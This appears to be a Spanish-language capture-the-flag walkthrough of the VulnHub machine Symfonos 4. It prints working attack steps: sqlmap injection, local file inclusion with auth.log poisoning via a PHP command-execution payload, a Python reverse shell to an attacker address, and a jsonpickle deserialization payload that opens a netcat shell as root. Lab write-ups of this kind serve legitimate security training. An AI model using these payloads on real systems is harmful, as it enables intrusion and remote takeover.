# SYMFONOS4
Desarrollo del CTF SYMFONOS4

## 1. Configuración de la VM

- Descarga de la VM: https://www.vulnhub.com/entry/symfonos-4,347/
- La VM no funciona en VMWARE Workstation. Toca utilizar VIRTUALBOX y VMWARE WORKSTATION ambos como BRIDGE para tener conexión.

## 2. Escaneo de Puertos

```
# Nmap 7.91 scan initiated Sun Apr  4 17:41:16 2021 as: nmap -n -P0 -p- -sS -sC -sV -vv -T5 -oA full 192.168.1.136
Nmap scan report for 192.168.1.136
Host is up, received arp-response (0.00055s latency).
Scanned at 2021-04-04 17:41:18 EDT for 13s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc6WD+nd5ZbnlOmJHKiExjfgbFX6q+QAKK3N+lsm6vntaQ3CRgdDBf37SsO5ptEHMUZrDPGBch03b0An18k6pHwSLfz5AuCTN3W0Rtqd2iFRqkhgoVatSEoESxCwULEpsRB738QhCeAfiTgHr/s5WtdQAgEoSBS6e4k8KHRD1M+8FVHrolrvJA//cQ7VzVvCDbQ/eYWh3kUjRJj/cFzY/Jpgwu0QxNhzXmHwroAjtzd0D59f/KIxG0ULyAr9aQoQVjy7fMN7wJyZZxhLLKSSMoT7G51khfn9Bwun9peI32IwZnVJ3L87fGgsSy/KdOjJDRLsGCXJNtT+jUviHAaTWz
|   256 be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIh5KJU7muB4UyLIXStFY9R+LekTaOgLGzYh/sWHOO+aj7OOE8QDWgjPTSZt0uDG9+bmT3Uz8v3EY2b0QDP5X9I=
|   256 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGBDJ/OjwxXNZ01JjiQXyOVhcY3z9ADXsEWJEOUMdHpd
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:61:75:4D (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos1.jpg" width=80% />

> Basicamente solo tenemos dos puertos TCP/22 y TCP/80. Toca enumerar mucho en Apache.

## 3. Enumeración

### 3.1. Enumeración HTTP

- Nos toca utilizar GOBUSTER, DIRSEARCH y NIKTO. Veamos el resultado.
- NIKTO rapidamente nos arroja resultados: atlantis.php

```
nikto -h http://192.168.1.136:80
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.136
+ Target Hostname:    192.168.1.136
+ Target Port:        80
+ Start Time:         2021-04-04 17:42:55 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Cookie PHPSESSID created without the httponly flag
+ Entry '/atlantis.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Server may leak inodes via ETags, header found with file /, inode: c9, size: 59058b74c9871, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7917 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2021-04-04 17:43:57 (GMT-4) (62 seconds)
---------------------------------------------------------------------------
```

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos2.jpg" width=80% />

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos3.jpg" width=80% />


## 4. Explotando la vulnerabilidad

### 4.1. Inyección SQL

- El portal tiene una inyección de código SQL básica. Toca explotarla y obtener la mayor información posible.

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos4.jpg" width=80% />

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos5.jpg" width=80% />

- Debido a que la inyección es básica utilizaremos SQLMAP. El archivo REQUEST.txt contiene el HTTP request capturado con BURP SUITE.

```
root@kali:~/SYMFONOS4# cat request.txt 
POST /atlantis.php HTTP/1.1
Host: 192.168.1.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.104/atlantis.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Connection: close
Cookie: PHPSESSID=g26np3b961eptrlebi6q44qr5e
Upgrade-Insecure-Requests: 1

username=admin&password=admin
root@kali:~/SYMFONOS4# sqlmap -r request.txt -p username --dbms=mysql --technique=BT --current-db
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.5.3.14#dev}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
```

- El resultado obtenido se resume en lo siguente:

```
current database: 'db'
current user: 'root@localhost'
available databases [4]:
[*] db
[*] information_schema
[*] mysql
[*] performance_schema

Database: db
[1 table]
+-------+
| users |
+-------+

[18:41:34] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
[18:41:34] [INFO] starting 4 processes 
[18:41:52] [WARNING] no clear password(s) found                                                                                                       
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| b674f184cd52edabf2c38c0142452c0af7e21f71e857cebb856e3ad7714b99f2 | admin    |
+------------------------------------------------------------------+----------+

Database: mysql
Table: user
[1 entry]
+--------+-------------------------------------------+
| user   | password                                  |
+--------+-------------------------------------------+
| root   | *C82E87B34FBDE65D16D0C96AF84410AA160D81ED |
+--------+-------------------------------------------+
```

> Ninguno de los HASHES me dio ninguna contraseña. Toca buscar otro camino.

### 4.2. LOCAL FILE INCLUSION (LFI)

- Al ingresar al portal se presenta el parámetro FILE, es claramente un mensaje. 

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos6.jpg" width=80% />

- Tocar probar y buscar un archivo que leer. Yo utilizo un módulo de BURP para esto. No encontré nada, que extraño.

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos7.jpg" width=80% />

- Lo que puede estar ocurriendo es que a nivel de desarrollo el programador este añadiendo una EXTENSIÓN, por ejemplo, la extensión TXT o LOG. Añadir (%00 - NULLBYTE) no está funcionando. Tocar probar nombres sin extensión por ejemplo: auth, access, daemon.

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos8.jpg" width=80% />

- Ahora que podemos leer el archivo AUTH.LOG tenemos que buscar la forma de realizar un POISONING sobre el archivo para ejecutarlo. Es el mismo procedimiento como cuando podemos leer los logs de apache o el correo electrónico. Debemos añadir algún código PHP.

```
root@kali:/var/mail# ssh '<?php system($_GET['cmd']); ?>'@192.168.1.104
<?php system($_GET[cmd]); ?>@192.168.1.104's password: 
Permission denied, please try again.
```

- Ahora lo ejecutamos y analizamos la respuesta del servidor

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos9.jpg" width=80% />

> Ahora obtenemos conexión reversa:

```
192.168.1.104/sea.php?file=../../../../var/log/auth&cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.101",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos10.jpg" width=80% />


## 5. Elevando Privilegios

### 5.1. Identificación de credenciales

- Encontramos la contraseña del usuario ROOT del servicio MYSQL

```
www-data@symfonos4:/var/www/html$ cat atlantis.php
cat atlantis.php
<?php
   define('DB_USERNAME', 'root');
   define('DB_PASSWORD', 'yVzyRGw3cG2Uyt2r');
   $db = new PDO("mysql:host=localhost:3306;dbname=db", DB_USERNAME,DB_PASSWORD);

   session_start();

   if($_SERVER["REQUEST_METHOD"] == "POST") {
   $username = $_POST["username"];
   $pwd = hash('sha256',$_POST["password"]);
```

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos11.jpg" width=80% />

### 5.2. Enumeración con LinEnum

- Ejecutamos LinEnum para identificar información sensible.

```
www-data@symfonos4:/tmp$ wget http://192.168.1.101/LinEnum.txt
wget http://192.168.1.101/LinEnum.txt
--2021-04-07 21:21:12--  http://192.168.1.101/LinEnum.txt
Connecting to 192.168.1.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/plain]
Saving to: 'LinEnum.txt.2'

LinEnum.txt.2       100%[===================>]  45.54K  --.-KB/s    in 0s      

2021-04-07 21:21:12 (400 MB/s) - 'LinEnum.txt.2' saved [46631/46631]

www-data@symfonos4:/tmp$ cp LinEnum.txt LinEnum.sh
cp LinEnum.txt LinEnum.sh
www-data@symfonos4:/tmp$ chmod +x LinEnum.sh
chmod +x LinEnum.sh
www-data@symfonos4:/tmp$ ./LinEnum.sh > output.txt
./LinEnum.sh > output.txt
./LinEnum.sh: line 219: echo: write error: Broken pipe
./LinEnum.sh: line 252: echo: write error: Broken pipe
```

- Dentro de las cosas que resaltan, es el proceso GUNICORN que esta asociado a un servidor web, además, podemos identificar que se ejecuta por el puerto TCP/8080. (https://gunicorn.org/). Se ejecuta con el usuario ROOT, con este proceso podemos elevar privilegios.

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos12.jpg" width=80% />

- Los archivos se encuentran en la carpeta /opt

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos13.jpg" width=80% />

### 5.3. SERIALIZACIÓN JSONPICKLE

- Si leemos el código de python, podemos entender el funcionamiento básico. La COOKIE "username" se encuentra en BASE64.

```
www-data@symfonos4:/opt/code$ cat app.py
cat app.py
from flask import Flask, request, render_template, current_app, redirect

import jsonpickle
import base64

app = Flask(__name__)

class User(object):

    def __init__(self, username):
        self.username = username


@app.route('/')
def index():
    if request.cookies.get("username"):
        u = jsonpickle.decode(base64.b64decode(request.cookies.get("username")))
        return render_template("index.html", username=u.username)
    else:
        w = redirect("/whoami")
        response = current_app.make_response(w)
        u = User("Poseidon")
        encoded = base64.b64encode(jsonpickle.encode(u))
        response.set_cookie("username", value=encoded)
        return response


@app.route('/whoami')
def whoami():
    user = jsonpickle.decode(base64.b64decode(request.cookies.get("username")))
    username = user.username
    return render_template("whoami.html", username=username)


if __name__ == '__main__':
    app.run()
```

```
www-data@symfonos4:/opt/code$ printf 'GET / HTTP/1.1\r\nHost:locahost:8080\r\n\r\n' | nc -v localhost 8080
```

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos14.jpg" width=80% />

- Para entendemor mejor vamos a realizar un PORT FORDWADING:

```
www-data@symfonos4:/opt/code$ socat TCP-LISTEN:8081,fork TCP:127.0.0.1:8080
socat TCP-LISTEN:8081,fork TCP:127.0.0.1:8080
```

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos15.jpg" width=80% />

- Con BURP podemos ver mejor la COOKIE "username". Vemos que esta encodeado en BASE64.

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos16.jpg" width=80% />

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos17.jpg" width=80% />

- Durante la revisión del código vemos que el encode y decode se encuentra asociado a JSONPICKLE. Toca leer y buscar alguna vulnerabilidad sobre esta librería. El primer enlace es el mismo código del CTF, toca probar el mecanismo utilizado.
- 
- Importante: La vulnerabilidad consiste en que es posible deserializar código y colocar código que luego se ejecuta en el servidor.

* https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/
* https://github.com/jsonpickle/jsonpickle/issues/178
* https://gist.github.com/j0lt-github/bb543e77a1a10c33cb56cf23d0837874

```
{"py/object": "__main__.Shell", "py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": ["whoami"]}, null, null, null]}

BASE64 encode:
eyJweS9vYmplY3QiOiAiX19tYWluX18uU2hlbGwiLCAicHkvcmVkdWNlIjogW3sicHkvdHlwZSI6ICJzdWJwcm9jZXNzLlBvcGVuIn0sIHsicHkvdHVwbGUiOiBbIndob2FtaSJdfSwgbnVsbCwgbnVsbCwgbnVsbF19
```

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos18.jpg" width=80% />

- Obtenemos un error 500. Este segundo enlace: https://github.com/jsonpickle/jsonpickle/issues/178 realiza una variante.

```
{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["nc -e /bin/bash 192.168.1.101 5555"], 0, 0, 0]}

BASE64 encode:
eyJweS9vYmplY3QiOiJfX21haW5fXy5TaGVsbCIsInB5L3JlZHVjZSI6W3sicHkvZnVuY3Rpb24iOiJvcy5zeXN0ZW0ifSxbIm5jIC1lIC9iaW4vYmFzaCAxOTIuMTY4LjEuMTAxIDU1NTUiXSwgMCwgMCwgMF19
```

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos19.jpg" width=80% />

<img src="https://github.com/El-Palomo/SYMFONOS4/blob/main/symfonos20.jpg" width=80% />



